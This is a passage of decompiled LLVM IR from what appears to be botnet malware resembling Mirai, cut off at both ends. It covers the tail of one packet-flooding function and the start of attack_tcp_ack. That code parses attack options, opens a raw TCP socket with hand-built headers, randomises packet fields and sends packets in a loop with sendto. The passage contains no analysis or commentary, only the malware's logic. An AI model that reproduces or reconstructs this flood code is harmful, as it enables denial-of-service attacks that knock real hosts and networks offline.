  %v1_a7c0 = trunc i32 %v0_a7c0 to i16
  %v3_a7c0 = add i32 %v0_a7bc, 16
  %v4_a7c0 = inttoptr i32 %v3_a7c0 to i16*
  store i16 %v1_a7c0, i16* %v4_a7c0, align 2
  %v0_a7c4 = load i32, i32* @r8, align 4
  store i32 %v0_a7c4, i32* %r2.global-to-local, align 4
  %v0_a7c8 = load i32, i32* @sl, align 4
  store i32 %v0_a7c8, i32* %r3.global-to-local, align 4
  %v0_a7cc = load i32, i32* @r4, align 4
  store i32 %v0_a7cc, i32* %r0.global-to-local, align 4
  %v4_a7d0 = call i32 @checksum_tcpudp(i32 %v0_a7cc, i32 %v0_a7bc, i32 %v0_a7c4, i32 %v0_a7c8)
  %v5_a7d0 = trunc i32 %v4_a7d0 to i16
  store i32 %v4_a7d0, i32* %r0.global-to-local, align 4
  %v3_a7d4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a7d4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_a7dc = mul i32 %v3_a7d4, 32
  store i32 %v3_a7dc, i32* %lr.global-to-local, align 4
  %v3_a7e0 = load i32, i32* @r5, align 4
  %v4_a7e0 = add i32 %v3_a7e0, 16
  %v5_a7e0 = inttoptr i32 %v4_a7e0 to i16*
  store i16 %v5_a7d0, i16* %v5_a7e0, align 2
  %v0_a7e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_a7e4 = load i32, i32* %r3.global-to-local, align 4
  %tmp103 = mul i32 %v1_a7e4, -8
  %v5_a7e4 = add i32 %v0_a7e4, %tmp103
  store i32 %v5_a7e4, i32* %lr.global-to-local, align 4
  %v0_a7e8 = load i32, i32* @r5, align 4
  %v1_a7e8 = add i32 %v0_a7e8, 2
  %v2_a7e8 = inttoptr i32 %v1_a7e8 to i16*
  %v3_a7e8 = load i16, i16* %v2_a7e8, align 2
  %v4_a7e8 = zext i16 %v3_a7e8 to i32
  store i32 %v4_a7e8, i32* @r5, align 4
  %v1_a7ec = load i32, i32* %ip.global-to-local, align 4
  %v2_a7ec = add i32 %v1_a7ec, %v5_a7e4
  store i32 %v2_a7ec, i32* @lr, align 4
  %v3_a7f0 = add i32 %v2_a7ec, 2
  %v4_a7f0 = inttoptr i32 %v3_a7f0 to i16*
  store i16 %v3_a7e8, i16* %v4_a7f0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a7fc = load i32, i32* @r4, align 4
  store i32 %v0_a7fc, i32* %r1.global-to-local, align 4
  %v0_a800 = load i32, i32* @sb, align 4
  store i32 %v0_a800, i32* %r0.global-to-local, align 4
  %v0_a804 = load i32, i32* @r7, align 4
  store i32 %v0_a804, i32* %r2.global-to-local, align 4
  %v0_a808 = load i32, i32* @lr, align 4
  %v6_a810 = call i32 @__libc_sendto(i32 %v0_a800, i32 %v0_a7fc, i32 %v0_a804, i32 16384, i32 %v0_a808, i32 16)
  %v3_a814 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a814, i32* %r3.global-to-local, align 4
  %v1_a818 = add i32 %v3_a814, 1
  store i32 %v1_a818, i32* %r0.global-to-local, align 4
  %v0_a81c = load i32, i32* @r6, align 4
  %v9_a81c = icmp eq i32 %v0_a81c, %v1_a818
  store i1 %v9_a81c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a818, i32* %stack_var_-44, align 4
  %v8_a824 = icmp sgt i32 %v0_a81c, %v1_a818
  br i1 %v8_a824, label %dec_label_pc_a730, label %dec_label_pc_a828

dec_label_pc_a828:                                ; preds = %dec_label_pc_a758
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a82c = icmp eq i32 %v0_a81c, 0
  store i1 %v2_a82c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a82c, label %dec_label_pc_a71c, label %dec_label_pc_a72c

dec_label_pc_a83c:                                ; preds = %dec_label_pc_a730
  %v0_a83c = call i32 @rand_next()
  %v1_a83c = trunc i32 %v0_a83c to i16
  store i32 %v0_a83c, i32* %r0.global-to-local, align 4
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i1 %v2_a844, i1* %cpsr_z.global-to-local, align 1
  %v3_a848 = load i32, i32* @r4, align 4
  %v4_a848 = add i32 %v3_a848, 4
  %v5_a848 = inttoptr i32 %v4_a848 to i16*
  store i16 %v1_a83c, i16* %v5_a848, align 2
  br i1 %v2_a844, label %dec_label_pc_a758, label %dec_label_pc_a83c.dec_label_pc_a850_crit_edge

dec_label_pc_a83c.dec_label_pc_a850_crit_edge:    ; preds = %dec_label_pc_a83c
  %v0_a850.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a850

dec_label_pc_a850:                                ; preds = %dec_label_pc_a83c.dec_label_pc_a850_crit_edge, %dec_label_pc_a74c
  %v0_a850 = phi i32 [ %v0_a850.pre, %dec_label_pc_a83c.dec_label_pc_a850_crit_edge ], [ %v7_a738, %dec_label_pc_a74c ]
  %v1_a850 = add i32 %v0_a850, 40
  store i32 %v1_a850, i32* @r0, align 4
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %v2_a858 = call i32 @rand_str(i32 %v1_a850, i32 %v6_a250)
  store i32 %v2_a858, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a758

; uselistorder directives
  uselistorder i32 %v0_a83c, { 1, 0 }
  uselistorder i32 %v1_a818, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_a7e4, { 1, 0 }
  uselistorder i32 %v4_a7d0, { 1, 0 }
  uselistorder i32 %v3_a79c, { 1, 0 }
  uselistorder i32 %v3_a77c, { 3, 2, 0, 1 }
  uselistorder i32 %v2_a768, { 1, 0 }
  uselistorder i1 %v2_a844, { 2, 3, 1, 0 }
  uselistorder i32 %v0_a654, { 1, 0 }
  uselistorder i32 %v0_a58c, { 1, 0 }
  uselistorder i32 %v3_a528, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_a4fc, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_a4e0, { 1, 0 }
  uselistorder i32 %v0_a49c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_a44c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a438, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_a3c4, { 1, 0 }
  uselistorder i32 %v6_a3bc, { 0, 2, 1, 3 }
  uselistorder i1 %v9_a3ec, { 1, 0 }
  uselistorder i32 %v4_a400, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_a348, { 1, 0, 2 }
  uselistorder i32 %v0_a4f8, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_a338, { 1, 0 }
  uselistorder i1 %v7_a330, { 1, 0, 2 }
  uselistorder i1 %v7_a2e4, { 1, 0 }
  uselistorder i32 %v3_a2e0, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_a6c0, { 1, 0 }
  uselistorder i32 %v1_a6a8, { 1, 0 }
  uselistorder i32 %v1_a690, { 1, 0 }
  uselistorder i32 %v1_a678, { 1, 0 }
  uselistorder i32 %v1_a660, { 1, 0 }
  uselistorder i32 %v3_a3f8, { 1, 0 }
  uselistorder i1 %v2_a414, { 1, 0 }
  uselistorder i32 %v1_a410, { 1, 0 }
  uselistorder i32 %v4_a40c, { 2, 0, 1 }
  uselistorder i32 %v2_a320, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_a2bc, { 1, 0 }
  uselistorder i1 %v7_a2b4, { 1, 0 }
  uselistorder i1 %v7_a288, { 1, 0 }
  uselistorder i32 %v3_a284, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_a270, { 2, 3, 1, 0 }
  uselistorder i32 %v6_a250, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_a238, { 1, 2, 0 }
  uselistorder i32 %v1_a218, { 1, 2, 0 }
  uselistorder i32 %v1_a1f8, { 1, 2, 0 }
  uselistorder i32 %v1_a1d8, { 1, 2, 0 }
  uselistorder i32 %v1_a1b8, { 1, 2, 0 }
  uselistorder i32 %v1_a198, { 1, 2, 0 }
  uselistorder i32 %v7_a174, { 1, 0 }
  uselistorder i32 %v1_a15c, { 1, 2, 0 }
  uselistorder i32 %v6_a0f4, { 2, 1, 3, 0 }
  uselistorder i32 %v2_a0dc, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_a0cc, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 50, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 54, 2, 1, 3, 5, 4, 7, 6, 8, 13, 9, 10, 11, 12, 16, 14, 15, 18, 17, 19, 22, 21, 20, 23, 24, 25, 27, 28, 26, 29, 31, 30, 32, 33, 34, 36, 35, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 and (i32 ptrtoint (i32* @global_var_ff00.34 to i32), i32 16776960), { 1, 2, 0, 4, 5, 3 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a758, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a72c, { 1, 0 }
  uselistorder label %dec_label_pc_a71c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a70c, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_a478, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a448, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a384, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_a364, { 1, 0 }
  uselistorder label %dec_label_pc_a340, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_a2f0, { 1, 0 }
  uselistorder label %dec_label_pc_a2d4, { 1, 0 }
}

define i32 @attack_tcp_ack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_a864 = load i32, i32* @r4, align 4
  %v18_a864 = load i32, i32* @sb, align 4
  %v24_a864 = load i32, i32* @fp, align 4
  %v27_a864 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_a880 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a884 = load i32, i32* @r5, align 4
  store i32 %v0_a884, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a894 = load i32, i32* @r4, align 4
  store i32 %v0_a894, i32* %r0.global-to-local, align 4
  %v5_a898 = inttoptr i32 %v0_a884 to i32*
  %v6_a898 = call i32 @attack_get_opt_int(i32 %v0_a894, i32* %v5_a898, i32 2, i32 0, i32 %v2_a880)
  %v1_a8a4 = urem i32 %v6_a898, 256
  store i32 %v1_a8a4, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a8b0 = load i32, i32* @r5, align 4
  store i32 %v0_a8b0, i32* %r1.global-to-local, align 4
  %v0_a8b4 = load i32, i32* @r4, align 4
  store i32 %v0_a8b4, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_a898, 16777216
  %v6_a8bc = sdiv i32 %sext, 16777216
  %v7_a8bc = inttoptr i32 %v0_a8b0 to i32*
  %v8_a8bc = call i32 @attack_get_opt_int(i32 %v0_a8b4, i32* %v7_a8bc, i32 3, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v6_a8bc)
  %v0_a8c0 = load i32, i32* @r5, align 4
  store i32 %v0_a8c0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v8_a8bc, i32* %sb.global-to-local, align 4
  %v0_a8d0 = load i32, i32* @r4, align 4
  store i32 %v0_a8d0, i32* %r0.global-to-local, align 4
  %v5_a8d4 = inttoptr i32 %v0_a8c0 to i32*
  %v6_a8d4 = call i32 @attack_get_opt_int(i32 %v0_a8d0, i32* %v5_a8d4, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_a8dc = urem i32 %v6_a8d4, 256
  store i32 %v1_a8dc, i32* %ip.global-to-local, align 4
  %v0_a8e0 = load i32, i32* @r5, align 4
  store i32 %v0_a8e0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a8ec = load i32, i32* @r4, align 4
  store i32 %v0_a8ec, i32* %r0.global-to-local, align 4
  %sext4 = mul i32 %v6_a8d4, 16777216
  %v5_a8f4 = sdiv i32 %sext4, 16777216
  %v6_a8f4 = inttoptr i32 %v0_a8e0 to i32*
  %v7_a8f4 = call i32 @attack_get_opt_int(i32 %v0_a8ec, i32* %v6_a8f4, i32 5, i32 0, i32 %v5_a8f4)
  %v1_a900 = urem i32 %v7_a8f4, 256
  store i32 %v1_a900, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a90c = load i32, i32* @r5, align 4
  store i32 %v0_a90c, i32* %r1.global-to-local, align 4
  %v0_a910 = load i32, i32* @r4, align 4
  store i32 %v0_a910, i32* %r0.global-to-local, align 4
  %v6_a918 = inttoptr i32 %v0_a90c to i32*
  %v7_a918 = call i32 @attack_get_opt_int(i32 %v0_a910, i32* %v6_a918, i32 6, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v1_a900)
  %v0_a920 = load i32, i32* @r5, align 4
  store i32 %v0_a920, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v7_a918, i32* @r6, align 4
  %v0_a930 = load i32, i32* @r4, align 4
  store i32 %v0_a930, i32* %r0.global-to-local, align 4
  %v6_a934 = inttoptr i32 %v0_a920 to i32*
  %v7_a934 = call i32 @attack_get_opt_int(i32 %v0_a930, i32* %v6_a934, i32 7, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_a93c = load i32, i32* @r5, align 4
  store i32 %v0_a93c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v7_a934, i32* @sl, align 4
  %v0_a94c = load i32, i32* @r4, align 4
  store i32 %v0_a94c, i32* %r0.global-to-local, align 4
  %v6_a950 = inttoptr i32 %v0_a93c to i32*
  %v7_a950 = call i32 @attack_get_opt_int(i32 %v0_a94c, i32* %v6_a950, i32 17, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_a95c = load i32, i32* @r5, align 4
  store i32 %v0_a95c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_a968 = load i32, i32* @r4, align 4
  store i32 %v0_a968, i32* %r0.global-to-local, align 4
  %v6_a96c = inttoptr i32 %v0_a95c to i32*
  %v7_a96c = call i32 @attack_get_opt_int(i32 %v0_a968, i32* %v6_a96c, i32 18, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v7_a950)
  %v0_a970 = load i32, i32* @r5, align 4
  store i32 %v0_a970, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a980 = load i32, i32* @r4, align 4
  store i32 %v0_a980, i32* %r0.global-to-local, align 4
  %v5_a984 = inttoptr i32 %v0_a970 to i32*
  %v6_a984 = call i32 @attack_get_opt_int(i32 %v0_a980, i32* %v5_a984, i32 11, i32 0, i32 %v7_a96c)
  %v0_a988 = load i32, i32* @r5, align 4
  store i32 %v0_a988, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a998 = load i32, i32* @r4, align 4
  store i32 %v0_a998, i32* %r0.global-to-local, align 4
  %v5_a99c = inttoptr i32 %v0_a988 to i32*
  %v6_a99c = call i32 @attack_get_opt_int(i32 %v0_a998, i32* %v5_a99c, i32 12, i32 1, i32 %v6_a984)
  %v0_a9a0 = load i32, i32* @r5, align 4
  store i32 %v0_a9a0, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9b0 = load i32, i32* @r4, align 4
  store i32 %v0_a9b0, i32* %r0.global-to-local, align 4
  %v5_a9b4 = inttoptr i32 %v0_a9a0 to i32*
  %v6_a9b4 = call i32 @attack_get_opt_int(i32 %v0_a9b0, i32* %v5_a9b4, i32 13, i32 0, i32 %v6_a99c)
  %v0_a9b8 = load i32, i32* @r5, align 4
  store i32 %v0_a9b8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9c8 = load i32, i32* @r4, align 4
  store i32 %v0_a9c8, i32* %r0.global-to-local, align 4
  %v5_a9cc = inttoptr i32 %v0_a9b8 to i32*
  %v6_a9cc = call i32 @attack_get_opt_int(i32 %v0_a9c8, i32* %v5_a9cc, i32 14, i32 0, i32 %v6_a9b4)
  %v0_a9d0 = load i32, i32* @r5, align 4
  store i32 %v0_a9d0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9e0 = load i32, i32* @r4, align 4
  store i32 %v0_a9e0, i32* %r0.global-to-local, align 4
  %v5_a9e4 = inttoptr i32 %v0_a9d0 to i32*
  %v6_a9e4 = call i32 @attack_get_opt_int(i32 %v0_a9e0, i32* %v5_a9e4, i32 15, i32 0, i32 %v6_a9cc)
  %v0_a9e8 = load i32, i32* @r5, align 4
  store i32 %v0_a9e8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9f8 = load i32, i32* @r4, align 4
  store i32 %v0_a9f8, i32* %r0.global-to-local, align 4
  %v5_a9fc = inttoptr i32 %v0_a9e8 to i32*
  %v6_a9fc = call i32 @attack_get_opt_int(i32 %v0_a9f8, i32* %v5_a9fc, i32 16, i32 0, i32 %v6_a9e4)
  %v0_aa00 = load i32, i32* @r5, align 4
  store i32 %v0_aa00, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_aa10 = load i32, i32* @r4, align 4
  store i32 %v0_aa10, i32* %r0.global-to-local, align 4
  %v5_aa14 = inttoptr i32 %v0_aa00 to i32*
  %v6_aa14 = call i32 @attack_get_opt_int(i32 %v0_aa10, i32* %v5_aa14, i32 0, i32 512, i32 %v6_a9fc)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_aa24 = load i32, i32* @r5, align 4
  store i32 %v0_aa24, i32* %r1.global-to-local, align 4
  %v0_aa28 = load i32, i32* @r4, align 4
  store i32 %v0_aa28, i32* %r0.global-to-local, align 4
  %v5_aa2c = inttoptr i32 %v0_aa24 to i32*
  %v6_aa2c = call i32 @attack_get_opt_int(i32 %v0_aa28, i32* %v5_aa2c, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_aa38 = load i32, i32* @global_var_24f10.62, align 4
  store i32 %v2_aa38, i32* %r3.global-to-local, align 4
  %v1_aa3c = urem i32 %v6_aa2c, 256
  store i32 %v1_aa3c, i32* %ip.global-to-local, align 4
  %v0_aa40 = load i32, i32* @r5, align 4
  store i32 %v0_aa40, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_aa48 = load i32, i32* @r4, align 4
  store i32 %v0_aa48, i32* %r0.global-to-local, align 4
  %v5_aa50 = inttoptr i32 %v0_aa40 to i32*
  %v6_aa50 = call i32 @attack_get_opt_ip(i32 %v0_aa48, i32* %v5_aa50, i32 25, i32 %v2_aa38, i32 %v1_aa3c)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_aa64 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v7_aa68 = icmp eq i32 %v3_aa64, -1
  store i1 %v7_aa68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa68, label %dec_label_pc_af30, label %dec_label_pc_aa74

dec_label_pc_aa74:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_aa7c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_aa7c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_aa90 = call i32 @__GI_setsockopt(i32 %v3_aa64, i32 0, i32 3, i32 %v6_aa7c, i32 4)
  store i32 %v5_aa90, i32* %r0.global-to-local, align 4
  %v7_aa94 = icmp eq i32 %v5_aa90, -1
  store i1 %v7_aa94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa94, label %dec_label_pc_af28, label %dec_label_pc_aa9c

dec_label_pc_aa9c:                                ; preds = %dec_label_pc_aa74
  %v0_aa9c = load i32, i32* %sb.global-to-local, align 4
  %v3_aa9c = mul i32 %v0_aa9c, 65536
  store i32 %v3_aa9c, i32* @r5, align 4
  %v0_aaa0 = load i32, i32* @r6, align 4
  %v0_aaa4 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_aaac = urem i32 %v0_aa9c, 65536
  store i32 %v3_aaac, i32* %r1.global-to-local, align 4
  %v3_aab0 = urem i32 %v0_aaa0, 65536
  store i32 %v3_aab0, i32* %r2.global-to-local, align 4
  %v3_aab4 = urem i32 %v0_aaa4, 65536
  store i32 %v3_aab4, i32* %r3.global-to-local, align 4
  %v0_aab8 = load i32, i32* @r7, align 4
  %v2_aab8 = icmp eq i32 %v0_aab8, 0
  store i1 %v2_aab8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_aab8, label %dec_label_pc_af3c, label %dec_label_pc_aad0

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aa9c
  %v3_aad4 = mul i32 %v6_aa14, 65536
  %v1_aad8 = add i32 %v3_aad4, 2621440
  store i32 %v1_aad8, i32* @lr, align 4
  %tmp59 = mul i32 %v0_aaa0, 256
  %v3_aafc = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_aaa4, 256
  %v3_ab00 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_aaa0, 256
  %v4_ab04 = urem i32 %tmp61, 256
  %v5_ab04 = or i32 %v4_ab04, %v3_aafc
  store i32 %v5_ab04, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_aaa4, 256
  %v4_ab08 = urem i32 %tmp62, 256
  %v5_ab08 = or i32 %v4_ab08, %v3_ab00
  store i32 %v5_ab08, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_aad8, 256
  %v3_ab1c = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_aa9c, 256
  %v3_ab20 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v7_a950, 256
  %v3_ab24 = and i32 %tmp65, 65280
  %v1_ab28 = urem i32 %v6_a984, 2
  %v1_ab2c = urem i32 %v6_a99c, 2
  %tmp66 = udiv i32 %v7_a950, 256
  %v4_ab30 = urem i32 %tmp66, 256
  %v5_ab30 = or i32 %v4_ab30, %v3_ab24
  %v4_ab34 = udiv i32 %v1_aad8, 16777216
  %v5_ab34 = or i32 %v3_ab1c, %v4_ab34
  store i32 %v5_ab34, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_aa9c, 256
  %v4_ab38 = urem i32 %tmp67, 256
  %v5_ab38 = or i32 %v4_ab38, %v3_ab20
  store i32 %v5_ab38, i32* @fp, align 4
  %v1_ab54 = urem i32 %v6_a9b4, 2
  store i32 %v1_ab54, i32* %r2.global-to-local, align 4
  %v1_ab58 = urem i32 %v6_a9cc, 2
  store i32 %v1_ab58, i32* %r3.global-to-local, align 4
  %v1_ab5c = urem i32 %v6_a9e4, 2
  store i32 %v1_ab5c, i32* %ip.global-to-local, align 4
  %v1_ab60 = urem i32 %v6_a9fc, 2
  store i32 %v1_ab60, i32* %r0.global-to-local, align 4
  %v1_ab64 = urem i32 %v6_a9b4, 256
  store i32 %v1_ab64, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %tmp = sub nsw i32 0, %v1_ab2c
  %v4_ac50 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_ab54
  %v4_ac6c = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_ab58
  %v4_ac80 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_ab5c
  %v3_ac94 = and i32 %tmp74, 2
  %v2_acb8 = icmp eq i32 %v1_ab64, 0
  %v1_abe0 = trunc i32 %v6_a8bc to i8
  %extract.t = trunc i32 %v5_a8f4 to i8
  br label %dec_label_pc_ab84

dec_label_pc_ab84:                                ; preds = %bb70, %dec_label_pc_aad0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ab90 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_ab90, i32* %r0.global-to-local, align 4
  %v2_ab98 = load i32, i32* @r4, align 4
  %v5_ab98 = mul i32 %v2_ab98, 4
  %v6_ab98 = add i32 %v5_ab98, %v2_a880
  %v7_ab98 = inttoptr i32 %v6_ab98 to i32*
  store i32 %v2_ab90, i32* %v7_ab98, align 4
  %v3_ab9c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ab9c, i32* %r2.global-to-local, align 4
  %v5_aba4 = mul i32 %v3_ab9c, 24
  %v1_aba8 = load i32, i32* @r8, align 4
  %v2_aba8 = add i32 %v1_aba8, %v5_aba4
  store i32 %v2_aba8, i32* %r1.global-to-local, align 4
  store i32 %v2_a880, i32* %r3.global-to-local, align 4
  %v4_abb0 = mul i32 %v3_ab9c, 4
  %v5_abb0 = add i32 %v4_abb0, %v2_a880
  %v6_abb0 = inttoptr i32 %v5_abb0 to i32*
  %v7_abb0 = load i32, i32* %v6_abb0, align 4
  store i32 %v7_abb0, i32* @r5, align 4
